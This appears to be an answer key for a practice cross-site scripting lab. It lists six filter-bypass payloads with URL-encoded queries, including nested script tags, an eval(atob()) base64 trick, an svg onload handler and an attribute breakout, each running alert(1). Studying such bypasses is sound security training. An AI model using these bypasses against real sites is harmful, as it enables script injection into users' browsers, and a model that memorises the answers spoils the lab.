# wafv2 — solutions

Round-2 WAF-style filter bypasses (keyword strip, event-handler strip, function name strip, length cap, partial tag strip, mixed filters).

### wafv2-level1

`/wafv2/level1/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E`

- payload: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- context: single-pass case-insensitive `script` strip — outer fragments rejoin

### wafv2-level2

`/wafv2/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only `on\w+=` stripped — script tag has no event handler

### wafv2-level3

`/wafv2/level3/?query=%3Cimg%20src=x%20onerror=eval(atob(%27YWxlcnQoMSk=%27))%3E`

- payload: `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`
- context: alert/confirm/prompt stripped — base64 decode bypass

### wafv2-level4

`/wafv2/level4/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>` (21 chars)
- context: length cap > 50 — short payload fits

### wafv2-level5

`/wafv2/level5/?query=%22%20autofocus%20onfocus=alert(1)%20x=%22`

- payload: `" autofocus onfocus=alert(1) x="`
- context: `<[a-zA-Z]` stripped; reflected in input value — attribute breakout

### wafv2-level6

`/wafv2/level6/?query=%3Cimg%20src=x%20onerror=%27alert(1)%27%3E`

- payload: `<img src=x onerror='alert(1)'>`
- context: `<script>` stripped, `"` encoded, but `<img>` and `'` survive
